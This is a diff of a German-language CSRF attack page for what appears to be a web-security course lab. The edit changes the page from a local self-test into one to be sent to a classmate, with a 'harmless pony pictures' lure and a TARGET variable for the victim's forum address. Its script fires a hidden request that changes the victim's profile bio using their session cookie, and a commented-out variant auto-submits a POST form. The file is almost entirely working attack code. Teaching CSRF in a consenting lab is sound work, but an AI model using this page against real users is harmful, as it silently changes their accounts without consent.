@@ -1,28 +1,35 @@
 <!doctype html>
 <!--
-  ANGREIFER-SEITE für die CSRF-Demo. Nur lokal im Lab.
-  Diese Datei einfach im Browser öffnen (file://) oder per zweitem Mini-Server
-  ausliefern, WÄHREND man im Cowboy-Forum (127.0.0.1:5000) eingeloggt ist.
+  ANGREIFER-SEITE für die CSRF-Demo (Kurs-Netz).
 
-  Das <img> feuert einen GET auf /set-bio. Der Browser hängt automatisch den
-  Session-Cookie des Opfers an -> die Bio wird ohne Zutun des Opfers geändert.
-  Genau das verhindert der CSRF-Token beim POST-Formular (/profile).
+  Kurs-Szenario: Schick diese Seite (oder den Link darin) einem/einer Mitspieler:in,
+  der/die im eigenen Cowboy-Forum eingeloggt ist. Öffnet die Person die Seite, ändert
+  sich UNBEMERKT ihre Bio — der Browser hängt ihren Session-Cookie automatisch an.
+
+  -> Trage unten bei TARGET die Forum-Adresse des OPFERS ein (dessen Instanz),
+     z. B. http://192.168.1.42:5000. Standard ist die eigene Instanz zum Testen.
+
+  Nur im Kurs-Netz, nur gegen Leute, die beim Lab mitspielen.
 -->
 <html lang="de">
-<head><meta charset="utf-8"><title>Süße Katzenbilder 🐱</title></head>
+<head><meta charset="utf-8"><title>Süße Ponybilder 🐴</title></head>
 <body>
-  <h1>Nur ein paar harmlose Katzenbilder…</h1>
+  <h1>Nur ein paar harmlose Ponybilder…</h1>
   <p>(im Hintergrund läuft der CSRF-Angriff)</p>
 
-  <!-- Variante A: unsichtbares Bild -> stiller GET-Request -->
-  <img src="http://127.0.0.1:5000/set-bio?bio=CSRF%20war%20hier%20%F0%9F%A4%A0"
-       width="1" height="1" alt="">
+  <img id="shot" width="1" height="1" alt="">
+  <script>
+    // Adresse des OPFER-Forums hier eintragen:
+    const TARGET = "http://127.0.0.1:5000";
+    // GET-basierter CSRF: unsichtbares Bild feuert die state-changing Route.
+    document.getElementById("shot").src =
+      TARGET + "/set-bio?bio=" + encodeURIComponent("CSRF war hier 🤠");
 
-  <!-- Variante B (auskommentiert): Auto-Post gegen eine POST-Route OHNE Token
-  <form id="f" action="http://127.0.0.1:5000/set-bio" method="POST">
-    <input type="hidden" name="bio" value="pwned">
-  </form>
-  <script>document.getElementById('f').submit()</script>
-  -->
+    // Variante B (POST ohne Token) – scheitert am CSRF-Token des Fix:
+    // const f=document.createElement('form');
+    // f.method='POST'; f.action=TARGET+'/set-bio';
+    // const i=document.createElement('input'); i.name='bio'; i.value='pwned';
+    // f.appendChild(i); document.body.appendChild(f); f.submit();
+  </script>
 </body>
 </html>
